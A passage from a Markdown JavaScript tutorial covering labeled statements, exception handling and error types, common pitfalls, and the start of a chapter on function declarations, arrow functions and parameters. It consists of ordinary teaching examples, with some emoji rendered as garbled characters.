**Explicit return (block):**

```javascript
const add = (a, b) => {
  const result = a + b;
  return result;
};
```

**Returning object literal:**

```javascript
// Wrong: interpreted as block
const makeObj = (x) => { x: x };  // undefined

// Correct: wrap in parentheses
const makeObj = (x) => ({ x: x });
```

---

### 2.3.4 Labels

### Syntax

```javascript
labelName: statement
```

---

### Label Loops

```javascript
outer: for (let i = 0; i < 3; i++) {
  for (let j = 0; j < 3; j++) {
    console.log(i, j);
  }
}
```

---

### Label Blocks

```javascript
myBlock: {
  console.log("start");
  if (condition) break myBlock;
  console.log("middle");
  if (condition2) break myBlock;
  console.log("end");
}
console.log("after");
```

---

### Common Use Cases

**Break nested loops:**

```javascript
outer: for (let row of matrix) {
  for (let cell of row) {
    if (cell === target) {
      console.log("Found!");
      break outer;  // Exit both loops
    }
  }
}
```

**Named blocks for clarity:**

```javascript
validation: {
  if (!input) {
    errors.push("Required");
    break validation;
  }
  
  if (input.length < 3) {
    errors.push("Too short");
    break validation;
  }
  
  // More validation...
}
```

---

### Best Practices

1. **Use labels sparingly** (often there's a better way)
2. **Name labels descriptively** (`outer`, `validation`, not `label1`)
3. **Prefer functions over labeled breaks** when possible
4. **Document why you're using a label**

------
## 2.4 Exception Handling

### 2.4.1 `try...catch...finally`

### Basic `try...catch`

```javascript
try {
  // Code that might throw
  riskyOperation();
} catch (error) {
  // Handle error
  console.error("Error:", error.message);
}
```

---

### `finally` Block

**Always executes:**

```javascript
try {
  riskyOperation();
} catch (error) {
  console.error(error);
} finally {
  // Cleanup (always runs)
  cleanup();
}
```

**Runs even with `return`:**

```javascript
function test() {
  try {
    return "try";
  } finally {
    console.log("finally");  // Runs before return
  }
}

test();
// Logs: "finally"
// Returns: "try"
```

**`finally` can override return:**

```javascript
function test() {
  try {
    return "try";
  } finally {
    return "finally";  // Overrides try's return
  }
}

test();  // Returns "finally"
```

---

### Catch Without Binding (ES2019)

```javascript
try {
  riskyOperation();
} catch {
  // Don't need error variable
  console.log("Something went wrong");
}
```

---

### Nested `try...catch`

```javascript
try {
  try {
    throw new Error("inner");
  } catch (error) {
    console.log("inner catch");
    throw error;  // Re-throw
  }
} catch (error) {
  console.log("outer catch");
}
// Logs: "inner catch", "outer catch"
```

---

### 2.4.2 `throw` Statement

### Throw Errors

```javascript
throw new Error("Something went wrong");

throw new TypeError("Wrong type");

throw new RangeError("Out of range");
```

---

### Throw Any Value

```javascript
throw "Error string";

throw 42;

throw { code: 500, message: "Server error" };

throw null;  // Don't do this
```

**Always throw `Error` objects (for stack traces):**

```javascript
// Bad
throw "Error";

// Good
throw new Error("Error");
```

---

### Custom Error Messages

```javascript
function divide(a, b) {
  if (b === 0) {
    throw new Error("Division by zero");
  }
  return a / b;
}

try {
  divide(10, 0);
} catch (error) {
  console.log(error.message);  // "Division by zero"
}
```

---

### 2.4.3 Built-In Error Types

### `Error` (Base Type)

```javascript
throw new Error("Generic error");

let error = new Error("Message");
error.name;     // "Error"
error.message;  // "Message"
error.stack;    // Stack trace
```

---

### `TypeError`

**Wrong type:**

```javascript
let x = null;
x.method();  // TypeError: Cannot read properties of null

// Manual throw
function process(value) {
  if (typeof value !== "number") {
    throw new TypeError("Expected number");
  }
}
```

---

### `ReferenceError`

**Undefined variable:**

```javascript
console.log(undeclaredVariable);
// ReferenceError: undeclaredVariable is not defined

// Or accessing before initialization
console.log(x);
let x = 10;
// ReferenceError: Cannot access 'x' before initialization
```

---

### `SyntaxError`

**Invalid syntax:**

```javascript
eval("let 123 = 'invalid'");
// SyntaxError: Invalid or unexpected token

JSON.parse("invalid json");
// SyntaxError: Unexpected token (in JSON)
```

---

### `RangeError`

**Out of range:**

```javascript
new Array(-1);
// RangeError: Invalid array length

(10).toFixed(101);
// RangeError: toFixed() digits argument must be between 0 and 100
```

---

### `URIError`

**Invalid URI:**

```javascript
decodeURIComponent("%");
// URIError: URI malformed
```

---

### `EvalError`

**Deprecated** (not used in modern JavaScript).

---

### `AggregateError`

**Multiple errors:**

```javascript
Promise.any([
  Promise.reject(new Error("Error 1")),
  Promise.reject(new Error("Error 2"))
]).catch(error => {
  console.log(error instanceof AggregateError);  // true
  console.log(error.errors);  // [Error: Error 1, Error: Error 2]
});
```

---

### 2.4.4 Custom Errors

### Extend `Error`

```javascript
class ValidationError extends Error {
  constructor(message) {
    super(message);
    this.name = "ValidationError";
  }
}

throw new ValidationError("Invalid input");
```

---

### With Additional Properties

```javascript
class HttpError extends Error {
  constructor(statusCode, message) {
    super(message);
    this.name = "HttpError";
    this.statusCode = statusCode;
  }
}

throw new HttpError(404, "Not found");
```

---

### Catch Specific Errors

```javascript
try {
  riskyOperation();
} catch (error) {
  if (error instanceof ValidationError) {
    console.log("Validation error:", error.message);
  } else if (error instanceof HttpError) {
    console.log("HTTP error:", error.statusCode);
  } else {
    console.log("Unknown error:", error);
  }
}
```

---

### 2.4.5 Error Stack Traces

### `stack` Property

```javascript
function a() { b(); }
function b() { c(); }
function c() { throw new Error("Oops"); }

try {
  a();
} catch (error) {
  console.log(error.stack);
}

// Stack trace:
// Error: Oops
//     at c (<file>:<line>:<col>)
//     at b (<file>:<line>:<col>)
//     at a (<file>:<line>:<col>)
//     at <global> (<file>:<line>:<col>)
```

---

### `Error.captureStackTrace()` (V8)

```javascript
class MyError extends Error {
  constructor(message) {
    super(message);
    this.name = "MyError";
    Error.captureStackTrace(this, MyError);  // Exclude constructor from stack
  }
}
```

---

### 2.4.6 Error Handling Patterns

### Fail Fast

```javascript
function processUser(user) {
  if (!user) {
    throw new Error("User is required");
  }
  
  if (!user.id) {
    throw new Error("User ID is required");
  }
  
  // Process...
}
```

---

### Try-Catch at Boundaries

**Catch at appropriate level:**

```javascript
// Low-level: let errors propagate
function readFile(path) {
  // Might throw, let caller handle
  return fs.readFileSync(path, "utf8");
}

// High-level: catch and handle
function loadConfig() {
  try {
    return readFile("config.json");
  } catch (error) {
    console.error("Failed to load config:", error);
    return getDefaultConfig();
  }
}
```

---

### Rethrowing

```javascript
try {
  riskyOperation();
} catch (error) {
  console.log("Logging error:", error);
  throw error;  // Re-throw for caller to handle
}
```

---

### Wrapping Errors

```javascript
try {
  lowLevelOperation();
} catch (error) {
  throw new Error(`High-level operation failed: ${error.message}`);
}
```

---

### Error Boundaries (React Pattern)

```javascript
class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false };
  }
  
  static getDerivedStateFromError(error) {
    return { hasError: true };
  }
  
  componentDidCatch(error, errorInfo) {
    logErrorToService(error, errorInfo);
  }
  
  render() {
    if (this.state.hasError) {
      return <h1>Something went wrong.</h1>;
    }
    
    return this.props.children;
  }
}

// Usage
<ErrorBoundary>
  <MyComponent />
</ErrorBoundary>
```

---

### Global Error Handlers

**Browser:**

```javascript
window.addEventListener("error", (event) => {
  console.error("Global error:", event.error);
});

window.addEventListener("unhandledrejection", (event) => {
  console.error("Unhandled promise rejection:", event.reason);
});
```

**Node.js:**

```javascript
process.on("uncaughtException", (error) => {
  console.error("Uncaught exception:", error);
  process.exit(1);
});

process.on("unhandledRejection", (reason, promise) => {
  console.error("Unhandled rejection:", reason);
});
```

---

### 2.4.7 Best Practices

1. **Always throw `Error` objects** (not strings/numbers)
2. **Use specific error types** (`TypeError`, custom errors)
3. **Catch at appropriate level** (boundaries, not everywhere)
4. **Provide context in error messages**
5. **Log errors with stack traces**
6. **Clean up resources in `finally`**
7. **Don't catch and ignore** (at least log)
8. **Validate inputs early** (fail fast)
9. **Use custom errors for domain logic**
10. **Handle async errors** (try-catch in async, .catch for promises)

---

## Common Pitfalls

### Pitfall 1: for-in on Arrays

```javascript
// âŒ WRONG: for-in iterates over ALL enumerable properties
const arr = [1, 2, 3];
arr.customProp = 'oops';

for (const i in arr) {
  console.log(i);  // "0", "1", "2", "customProp" â€” includes custom property!
}

// âœ… CORRECT: Use for-of for arrays
for (const value of arr) {
  console.log(value);  // 1, 2, 3
}
```

### Pitfall 2: Switch Fallthrough

```javascript
// âŒ WRONG: Missing break causes fallthrough
switch (day) {
  case 'Monday':
    console.log('Start of week');
  case 'Tuesday':  // Falls through! Both log on Monday
    console.log('Still early');
    break;
}

// âœ… CORRECT: Always break (or use return/throw)
switch (day) {
  case 'Monday':
    console.log('Start of week');
    break;
  case 'Tuesday':
    console.log('Still early');
    break;
}
```

### Pitfall 3: Loop Variable Closure with var

```javascript
// âŒ WRONG: var is function-scoped, shared across iterations
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);  // Logs 3, 3, 3
}

// âœ… CORRECT: let creates new binding per iteration
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);  // Logs 0, 1, 2
}
```

### Pitfall 4: Catching Too Broadly

```javascript
// âŒ WRONG: Catches ALL errors, hides bugs
try {
  const result = someFunction();
  processs(result);  // Typo: 'processs' doesn't exist!
} catch (e) {
  console.log('someFunction failed');  // Wrong! It was processs that failed
}

// âœ… CORRECT: Check error type
try {
  const result = someFunction();
  process(result);
} catch (e) {
  if (e instanceof NetworkError) {
    console.log('Network failed, retrying...');
  } else {
    throw e;  // Re-throw unexpected errors
  }
}
```

### Pitfall 5: finally with return

```javascript
// âš ï¸ GOTCHA: finally return overrides try/catch return!
function strange() {
  try {
    return 'try';
  } finally {
    return 'finally';  // This wins!
  }
}

console.log(strange());  // 'finally' â€” NOT 'try'!

// âœ… CORRECT: Don't return in finally
function correct() {
  try {
    return 'try';
  } finally {
    cleanup();  // OK: side effects, no return
  }
}
```

---

## Summary

### Loop Comparison

|Loop|Use Case|
|---|---|
|`for`|Known iterations, index needed|
|`while`|Unknown iterations, condition-based|
|`do-while`|At least one iteration guaranteed|
|`for-in`|Object properties|
|`for-of`|Array/iterable values|
|`for await-of`|Async iterables|

### Jump Statements

- **`break`**: Exit loop/switch/block
- **`continue`**: Skip to next iteration
- **`return`**: Exit function with value
- **Labels**: Target for break/continue

### Exception Handling

- **`try-catch`**: Handle errors
- **`finally`**: Cleanup (always runs)
- **`throw`**: Raise error
- **Built-in errors**: `Error`, `TypeError`, `ReferenceError`, etc.
- **Custom errors**: Extend `Error` class
- **Stack traces**: Debug with `error.stack`

---

## 2.5 Control Flow Summary

| Construct | Purpose | Key Points |
|-----------|---------|------------|
| `if...else` | Conditional branching | Uses truthiness; 8 falsy values |
| `switch` | Multi-way branching | Strict equality (`===`); requires `break` |
| `for` | Counted iteration | `let` creates per-iteration binding |
| `while` | Condition-based iteration | Test before body |
| `do...while` | Guaranteed-once iteration | Test after body |
| `for...in` | Property iteration | Strings; includes inherited; avoid on arrays |
| `for...of` | Value iteration | Works on iterables; use for arrays |
| `for await...of` | Async iteration | Awaits each value |
| `break` | Exit loop/switch | Can target labels |
| `continue` | Skip iteration | Can target labels |
| `return` | Exit function | Returns value or `undefined` |
| `throw` | Raise exception | Can throw any value |
| `try...catch` | Handle exceptions | `catch` receives error |
| `finally` | Cleanup | Always executes |

### Best Practices

1. **Use `for...of` for arrays**, not `for...in`
2. **Always `break` in switch** unless fall-through is intentional
3. **Guard clauses** reduce nesting in conditionals
4. **Labels sparingly** â€” prefer extracting to functions
5. **Custom errors** extend `Error` for typed exception handling
6. **`finally` for cleanup** â€” runs even if `return`/`throw` in try/catch

---

**End of Chapter 2: Control Flow**

With conditionals, loops, and exception handling mastered, you're ready for functions and closures.


# 03-Functions.md

# 3 Functions

Functions are first-class citizens in JavaScriptâ€”they can be assigned to variables, passed as arguments, returned from other functions, and have properties. This chapter covers function fundamentals through advanced patterns, from basic declarations to generators and async functions.

---

## 3.1 Function Basics


### 3.1.1 Function Declarations

### Basic Syntax

```javascript
function name(parameters) {
  // Body
  return value;
}
```

**Example:**

```javascript
function greet(name) {
  return `Hello, ${name}!`;
}

console.log(greet("Alice"));  // "Hello, Alice!"
```

---

### Characteristics

**1. Hoisted to top of scope:**

```javascript
// Can call before declaration
console.log(add(5, 3));  // 8

function add(a, b) {
  return a + b;
}
```

**2. Creates a named binding:**

```javascript
function myFunc() { }

console.log(myFunc.name);  // "myFunc"
console.log(typeof myFunc);  // "function"
```

**3. Not an expression (cannot use in expression position):**

```javascript
// SyntaxError: function statement requires a name
if (true) function f() { }  // Not allowed in strict mode

// Valid: function expression
if (true) {
  function f() { }  // Allowed (function declaration in block)
}
```

---

### Function Hoisting

**Entire function is hoisted:**

```javascript
console.log(greet("Alice"));  // "Hello, Alice!"

function greet(name) {
  return `Hello, ${name}!`;
}
```

**Conceptually transformed to:**

```javascript
function greet(name) {
  return `Hello, ${name}!`;
}

console.log(greet("Alice"));  // "Hello, Alice!"
```

**Function declarations take precedence over `var`:**

```javascript
console.log(typeof foo);  // "function"

var foo = "variable";

function foo() {
  return "function";
}

console.log(typeof foo);  // "string" (reassigned)
```

**Compilation phase:**

1. `var foo` creates binding, initializes to `undefined`
2. `function foo() {}` overwrites with function
3. Execution: `foo = "variable"` reassigns to string

---

### Block-Scoped Function Declarations (Strict Mode)

**In strict mode, function declarations are block-scoped:**

```javascript
"use strict";

if (true) {
  function f() { return "inside"; }
  console.log(f());  // "inside"
}

console.log(typeof f);  // "undefined" (not accessible outside block)
```

**In sloppy mode, behavior is inconsistent:**

```javascript
// Sloppy mode (avoid this)
if (true) {
  function f() { return "inside"; }
}

console.log(typeof f);  // "function" (hoisted to enclosing function/global)
```

**Always use strict mode to avoid confusion.**

---

### 3.1.2 Function Expressions

### Basic Syntax

```javascript
const name = function(parameters) {
  // Body
  return value;
};
```

**Example:**

```javascript
const greet = function(name) {
  return `Hello, ${name}!`;
};

console.log(greet("Alice"));  // "Hello, Alice!"
```

---

### Characteristics

**1. Not hoisted (variable is hoisted, not the function):**

```javascript
console.log(add(5, 3));  // TypeError: add is not a function

var add = function(a, b) {
  return a + b;
};
```

**With `var` hoisting:**

```javascript
var add;  // Hoisted, initialized to undefined
console.log(add(5, 3));  // TypeError (undefined is not a function)

add = function(a, b) {
  return a + b;
};
```

**With `let`/`const` (TDZ):**

```javascript
console.log(add(5, 3));  // ReferenceError: Cannot access 'add' before initialization

const add = function(a, b) {
  return a + b;
};
```

**2. Can be used in expression position:**

```javascript
// As argument
setTimeout(function() {
  console.log("delayed");
}, 1000);

// As return value
function createAdder() {
  return function(x) {
    return x + 10;
  };
}

// In array
const funcs = [
  function() { return 1; },
  function() { return 2; }
];
```

**3. Usually anonymous (but can be named):**

```javascript
const greet = function(name) {
  return `Hello, ${name}!`;
};

console.log(greet.name);  // "greet" (inferred from variable name)
```

---

### 3.1.3 Anonymous Functions

### Definition

Functions without a name:

```javascript
function(x) {
  return x * 2;
}
```

---

### Common Uses

**Callbacks:**

```javascript
setTimeout(function() {
  console.log("done");
}, 1000);

arr.map(function(x) {
  return x * 2;
});
```

**IIFEs (Immediately Invoked Function Expressions):**

```javascript
(function() {
  console.log("IIFE");
})();

// Alternative syntax
(function() {
  console.log("IIFE");
}());
```

**Event handlers:**

```javascript
button.addEventListener("click", function(event) {
  console.log("clicked");
});
```

---

### Name Inference

**Modern engines infer names from context:**

```javascript
const greet = function(name) {
  return `Hello, ${name}!`;
};

console.log(greet.name);  // "greet"

const obj = {
  method: function() { }
};

console.log(obj.method.name);  // "method"
```

**But not always:**

```javascript
const funcs = [function() { }];
console.log(funcs[0].name);  // "" (empty)

arr.map(function(x) { return x * 2; })[0].name;  // "" (empty)
```

---

### Drawbacks of Anonymous Functions

**1. Stack traces are less helpful:**

```javascript
// Anonymous
setTimeout(function() {
  throw new Error("oops");
}, 1000);

// Stack trace:
// Error: oops
//     at <anonymous>  â† Not helpful

// Named
setTimeout(function handleTimeout() {
  throw new Error("oops");
}, 1000);

// Stack trace:
// Error: oops
//     at handleTimeout  â† More helpful
```

**2. No self-reference:**

```javascript
// Cannot reference itself
const countdown = function(n) {
  if (n > 0) {
    console.log(n);
    countdown(n - 1);  // Works (variable name)
  }
};

countdown(3);  // 3, 2, 1

// But if reassigned:
const original = countdown;
countdown = null;
original(3);  // TypeError: countdown is not a function
```

---

### 3.1.4 Named Function Expressions

### Syntax

```javascript
const name1 = function name2(parameters) {
  // Body
};
```

**Example:**

```javascript
const factorial = function fact(n) {
  if (n <= 1) return 1;
  return n * fact(n - 1);  // Self-reference
};

console.log(factorial(5));  // 120
```

---

### Name Scope

**Function name only visible inside function:**

```javascript
const greet = function sayHello(name) {
  console.log(sayHello.name);  // "sayHello" (accessible inside)
  return `Hello, ${name}!`;
};

console.log(greet.name);    // "sayHello"
console.log(sayHello);      // ReferenceError: sayHello is not defined
```

---

### Self-Reference

**Reliable recursion:**

```javascript
const countdown = function count(n) {
  if (n > 0) {
    console.log(n);
    count(n - 1);  // Always refers to this function
  }
};

const original = countdown;
countdown = null;
original(3);  // Still works! (count is stable)
```

**vs anonymous:**

```javascript
let countdown = function(n) {
  if (n > 0) {
    console.log(n);
    countdown(n - 1);  // References variable (can change)
  }
};

let original = countdown;
countdown = null;
original(3);  // TypeError: countdown is not a function
```

---

### Best Practice

**Use named function expressions for:**

1. **Recursion** (reliable self-reference)
2. **Stack traces** (better debugging)
3. **Self-documenting code** (clear intent)

```javascript
// Good
const users = data.map(function transformUser(raw) {
  return {
    id: raw.id,
    name: raw.name.toUpperCase()
  };
});

// Stack trace will show "transformUser" instead of "<anonymous>"
```

---

### 3.1.5 Function Properties and Methods

### `name` Property

```javascript
function myFunc() { }
console.log(myFunc.name);  // "myFunc"

const anon = function() { };
console.log(anon.name);  // "anon" (inferred)

const named = function myName() { };
console.log(named.name);  // "myName"

const arrow = () => { };
console.log(arrow.name);  // "arrow" (inferred)
```

---

### `length` Property

**Number of parameters (excluding rest and defaults):**

```javascript
function f(a, b, c) { }
console.log(f.length);  // 3

function g(a, b = 2, c) { }
console.log(g.length);  // 1 (stops at first default)

function h(a, b, ...rest) { }
console.log(h.length);  // 2 (rest not counted)
```

---

### `prototype` Property

**Only on regular functions (not arrows):**

```javascript
function F() { }
console.log(F.prototype);  // { constructor: F }

const arrow = () => { };
console.log(arrow.prototype);  // undefined
```

---

### `call()`, `apply()`, `bind()`

**Explicit `this` binding:**

```javascript
function greet(greeting) {
  return `${greeting}, ${this.name}!`;
}

const user = { name: "Alice" };

// call: arguments individually
greet.call(user, "Hello");  // "Hello, Alice!"

// apply: arguments as array
greet.apply(user, ["Hi"]);  // "Hi, Alice!"

// bind: create new function with bound this
const boundGreet = greet.bind(user, "Hey");
boundGreet();  // "Hey, Alice!"
```

---

### 3.1.6 IIFEs (Immediately Invoked Function Expressions)

### Syntax

```javascript
(function() {
  // Body
})();

// Alternative
(function() {
  // Body
}());
```

---

### Use Cases

**1. Create private scope:**

```javascript
(function() {
  const private = "hidden";
  console.log(private);  // "hidden"
})();

console.log(private);  // ReferenceError
```

**2. Avoid global pollution:**

```javascript
(function() {
  const helper = function() { };
  const utils = { };
  
  // Use helper and utils
  // They don't leak to global scope
})();
```

**3. Module pattern (pre-ES6):**

```javascript
const myModule = (function() {
  const privateVar = "secret";
  
  function privateFunc() {
    return privateVar;
  }
  
  return {
    publicMethod() {
      return privateFunc();
    }
  };
})();

console.log(myModule.publicMethod());  // "secret"
console.log(myModule.privateVar);      // undefined
```

**4. Capture loop variable (pre-ES6):**

```javascript
for (var i = 0; i < 3; i++) {
  (function(j) {
    setTimeout(function() {
      console.log(j);
    }, 100);
  })(i);
}
// 0, 1, 2 (each IIFE has its own j)
```

---

### Modern Alternative: Blocks

**ES6 block scoping:**

```javascript
{
  const private = "hidden";
  console.log(private);
}

console.log(private);  // ReferenceError
```

**Modules:**

```javascript
// module.js
const privateVar = "secret";

function privateFunc() { }

export function publicMethod() {
  return privateFunc();
}
```

---

### 3.1.7 Function Declaration vs Expression

### Comparison

|Feature|Declaration|Expression|
|---|---|---|
|**Hoisting**|Entire function|Variable only (not function)|
|**Name required**|Yes|No (but can be named)|
|**Expression position**|No|Yes|
|**Block scoping (strict)**|Yes|N/A (follows variable scoping)|
|**Best for**|Top-level, module exports|Callbacks, conditional assignment|

---

### When to Use Each

**Function Declaration:**

```javascript
// Top-level functions
function processData(data) {
  return data.map(transform);
}

// Named exports (modules)
export function validate(input) {
  // ...
}
```

**Function Expression:**

```javascript
// Callbacks
arr.map(function(x) { return x * 2; });

// Conditional assignment
const operation = isAdd ? function(a, b) { return a + b; }
                        : function(a, b) { return a - b; };

// Methods
const obj = {
  method: function() { }
};

// IIFEs
(function() { })();
```

---


## 3.2 Arrow Functions


### 3.2.1 Syntax Variations

### Basic Syntax

```javascript
(parameters) => { body }
```

---

### No Parameters

```javascript
() => { return 42; }

// Or implicit return
() => 42
```

---

### Single Parameter (No Parentheses)

```javascript
x => { return x * 2; }

// Implicit return
x => x * 2
```

---

### Multiple Parameters

```javascript
(a, b) => { return a + b; }

// Implicit return
(a, b) => a + b
```

---

### Default Parameters

```javascript
(a = 0, b = 0) => a + b
```

---

### Rest Parameters

```javascript
(...args) => args.reduce((sum, x) => sum + x, 0)
```

---

### Destructuring Parameters

```javascript
({ x, y }) => x + y

([a, b]) => a + b
```

---

### 3.2.2 Implicit Return

### Single Expression (No Braces)

```javascript
const double = x => x * 2;

const add = (a, b) => a + b;

const greet = name => `Hello, ${name}!`;
```

---

### Returning Object Literal

**Must wrap in parentheses:**

```javascript
// Wrong: interpreted as block
const makeObj = x => { x: x };  // undefined (block, not object)

// Correct: wrap in parentheses
const makeObj = x => ({ x: x });

const user = name => ({ name, age: 0 });
```

---

### Multi-Line Implicit Return

```javascript
const transform = data =>
  data
    .map(x => x * 2)
    .filter(x => x > 10)
    .reduce((sum, x) => sum + x, 0);
```

---

### Block Body (Explicit Return)

```javascript
const processUser = user => {
  const name = user.name.toUpperCase();
  const age = user.age;
  return { name, age };
};
```

---

### 3.2.3 Lexical `this` Binding

### No Own `this`

Arrow functions **don't have their own `this`**â€”they inherit from enclosing scope:

```javascript
const obj = {
  value: 42,
  
  regularFunc: function() {
    console.log(this.value);  // 42 (this = obj)
  },
  
  arrowFunc: () => {
    console.log(this.value);  // undefined (this = outer scope, not obj)
  }
};

obj.regularFunc();  // 42
obj.arrowFunc();    // undefined
```

---

### Lexical Scope Example

```javascript
const obj = {
  value: 42,
  
  method() {
    // Regular function: this = obj
    setTimeout(function() {
      console.log(this.value);  // undefined (this = global in non-strict)
    }, 100);
    
    // Arrow function: inherits this from method
    setTimeout(() => {
      console.log(this.value);  // 42 (this = obj)
    }, 100);
  }
};

obj.method();
```

---

### Old Workaround (Pre-ES6)

```javascript
const obj = {
  value: 42,
  
  method: function() {
    const self = this;  // Capture this
    
    setTimeout(function() {
      console.log(self.value);  // 42
    }, 100);
  }
};
```

**Arrow functions eliminate this pattern.**

---

### Cannot Bind `this`

**`call`, `apply`, `bind` don't change `this`:**

```javascript
const obj = { value: 42 };

const arrow = () => console.log(this.value);

arrow.call(obj);   // undefined (call ignored)
arrow.apply(obj);  // undefined (apply ignored)
arrow.bind(obj)(); // undefined (bind ignored)
```

---

### Class Methods

**Use arrow functions for event handlers:**

```javascript
class Counter {
  constructor() {
    this.count = 0;
    
    // Regular method: this depends on how it's called
    this.regularIncrement = function() {
      this.count++;
    };
    
    // Arrow function: this always = instance
    this.arrowIncrement = () => {
      this.count++;
    };
  }
}

const counter = new Counter();

// Regular method loses this
const regular = counter.regularIncrement;
regular();  // TypeError (this = undefined in strict mode)

// Arrow function preserves this
const arrow = counter.arrowIncrement;
arrow();  // Works! (this = counter)
```

**Class fields with arrow functions:**

```javascript
class Counter {
  count = 0;
  
  // Arrow function as class field
  increment = () => {
    this.count++;
  }
}

const counter = new Counter();
const increment = counter.increment;
increment();  // Works! (this = counter)
```

---

### 3.2.4 No `arguments` Object

### Arrow Functions Don't Have `arguments`

```javascript
function regularFunc() {
  console.log(arguments);  // Works
}

const arrowFunc = () => {
  console.log(arguments);  // ReferenceError (no arguments)
};

regularFunc(1, 2, 3);  // [1, 2, 3]
arrowFunc(1, 2, 3);    // Error
```

---

### Use Rest Parameters Instead

```javascript
const sum = (...args) => {
  return args.reduce((total, x) => total + x, 0);
};

sum(1, 2, 3);  // 6
```

---

### Accessing Outer `arguments`

**Arrow functions can access enclosing function's `arguments`:**

```javascript
function outer() {
  const inner = () => {
    console.log(arguments);  // Accesses outer's arguments
  };
  
  inner();
}

outer(1, 2, 3);  // [1, 2, 3]
```

---

### 3.2.5 Cannot Be Constructors

### No `new`

**Arrow functions cannot be used with `new`:**

```javascript
const Person = (name) => {
  this.name = name;
};

const alice = new Person("Alice");  // TypeError: Person is not a constructor
```

---

### No `prototype` Property

```javascript
const arrow = () => { };
console.log(arrow.prototype);  // undefined

function regular() { }
console.log(regular.prototype);  // { constructor: regular }
```

---

### Use Regular Functions for Constructors

```javascript
function Person(name) {
  this.name = name;
}

const alice = new Person("Alice");
console.log(alice.name);  // "Alice"
```

**Or classes:**

```javascript
class Person {
  constructor(name) {
    this.name = name;
  }
}

const alice = new Person("Alice");
```

---

### 3.2.6 Other Differences

### No `super`

**Arrow functions cannot access `super`:**

```javascript
class Child extends Parent {
  method() {
    const arrow = () => {
      super.method();  // SyntaxError
    };
  }
}
```

---

### No `new.target`

```javascript
function regular() {
  console.log(new.target);  // Works
}

const arrow = () => {
  console.log(new.target);  // SyntaxError
};
```

---

### No `yield`

**Cannot be generators:**

```javascript
const gen = *() => {  // SyntaxError
  yield 1;
};
```

---

### 3.2.7 When to Use Arrow Functions

### Good Use Cases

**1. Short callbacks:**

```javascript
arr.map(x => x * 2)
arr.filter(x => x > 0)
arr.reduce((sum, x) => sum + x, 0)
```

**2. Lexical `this` needed:**

```javascript
class Timer {
  start() {
    setInterval(() => {
      this.tick();  // this = Timer instance
    }, 1000);
  }
}
```

**3. Higher-order functions:**

```javascript
const multiply = x => y => x * y;
const double = multiply(2);
double(5);  // 10
```

**4. Promise chains:**

```javascript
fetch(url)
  .then(res => res.json())
  .then(data => processData(data))
  .catch(err => console.error(err));
```

---

### When NOT to Use

**1. Object methods:**

```javascript
// Bad: this doesn't refer to obj
const obj = {
  value: 42,
  getValue: () => this.value  // undefined
};

// Good: use regular function or method shorthand
const obj = {
  value: 42,
  getValue() { return this.value; }
};
```

**2. Event handlers (when you need `this`):**

```javascript
// Bad: this doesn't refer to button
button.addEventListener("click", () => {
  this.classList.toggle("active");  // Error
});

// Good: regular function
button.addEventListener("click", function() {
  this.classList.toggle("active");  // Works
});
```

**3. Constructors:**

```javascript
// Bad: cannot use with new
const Person = (name) => {
  this.name = name;
};

// Good: use class or regular function
class Person {
  constructor(name) {
    this.name = name;
  }
}
```

**4. When you need `arguments`:**

```javascript
// Bad: no arguments object
const sum = () => {
  console.log(arguments);  // ReferenceError
};

// Good: use rest parameters
const sum = (...args) => {
  return args.reduce((total, x) => total + x, 0);
};
```

---


## 3.3 Parameters and Arguments


### 3.3.1 Default Parameters

### Basic Syntax

```javascript
function greet(name = "Guest") {
  return `Hello, ${name}!`;
}

greet();        // "Hello, Guest!"
greet("Alice"); // "Hello, Alice!"
```

---

### Default Values Can Be Expressions

```javascript
function createUser(name, id = generateId()) {
  return { name, id };
}

function greet(name, greeting = `Hello, ${name}`) {
  return greeting;
}
```

---

### Defaults Evaluated at Call Time

```javascript
let count = 0;

function increment(x = count++) {
  return x;
}

increment();  // 0 (count becomes 1)
increment();  // 1 (count becomes 2)
increment(10);  // 10 (default not used, count unchanged)
```

---

### Previous Parameters in Defaults

```javascript
function createRange(start, end = start + 10) {
  return { start, end };
}

createRange(5);  // { start: 5, end: 15 }
```

**But TDZ applies:**

```javascript
function f(a = b, b = 2) {  // ReferenceError: b in TDZ
  return [a, b];
}
```

---

### `undefined` Triggers Default

```javascript
function greet(name = "Guest") {
  return `Hello, ${name}!`;
}

greet(undefined);  // "Hello, Guest!" (undefined triggers default)
greet(null);       // "Hello, null!" (null doesn't trigger default)
greet("");         // "Hello, !" (empty string doesn't trigger default)
```

---

### Defaults and `length` Property

**Parameters with defaults not counted:**

```javascript
function f(a, b = 2, c) { }
console.log(f.length);  // 1 (stops at first default)

function g(a, b, c = 3) { }
console.log(g.length);  // 2
```

---

### 3.3.2 Rest Parameters

### Basic Syntax

```javascript
function sum(...numbers) {
  return numbers.reduce((total, n) => total + n, 0);
}

sum(1, 2, 3);      // 6
sum(1, 2, 3, 4, 5); // 15
```

---

### Rest is an Array

```javascript
function log(...args) {
  console.log(Array.isArray(args));  // true
  console.log(args.length);
}

log(1, 2, 3);  // true, 3
```

---

### Combined with Regular Parameters

**Rest must be last:**

```javascript
function greet(greeting, ...names) {
  return `${greeting}, ${names.join(" and ")}!`;
}

greet("Hello", "Alice", "Bob");  // "Hello, Alice and Bob!"

// Error: rest must be last
function invalid(...args, last) { }  // SyntaxError
```

---

### Rest vs `arguments`

|Feature|Rest (`...args`)|`arguments`|
|---|---|---|
|**Type**|Real array|Array-like object|
|**Methods**|All array methods|None (must convert)|
|**Arrow functions**|Works|Not available|
|**Excludes named params**|Yes|No (includes all)|

**Example:**

```javascript
function withRest(a, b, ...rest) {
  console.log(rest);  // [3, 4, 5] (excludes a and b)
}

function withArguments(a, b) {
  console.log(arguments);  // [1, 2, 3, 4, 5] (includes all)
}

withRest(1, 2, 3, 4, 5);
withArguments(1, 2, 3, 4, 5);
```

---

### Rest and `length`

**Rest parameter not counted:**

```javascript
function f(a, b, ...rest) { }
console.log(f.length);  // 2
```

---

### 3.3.3 `arguments` Object

### Basic Usage

**Array-like object containing all arguments:**

```javascript
function sum() {
  let total = 0;
  for (let i = 0; i < arguments.length; i++) {
    total += arguments[i];
  }
  return total;
}

sum(1, 2, 3);  // 6
```

---

### Not a Real Array

```javascript
function f() {
  console.log(Array.isArray(arguments));  // false
  console.log(arguments instanceof Array);  // false
  
  // No array methods
  arguments.forEach(x => console.log(x));  // TypeError
}
```

**Convert to array:**

```javascript
function f() {
  // ES6
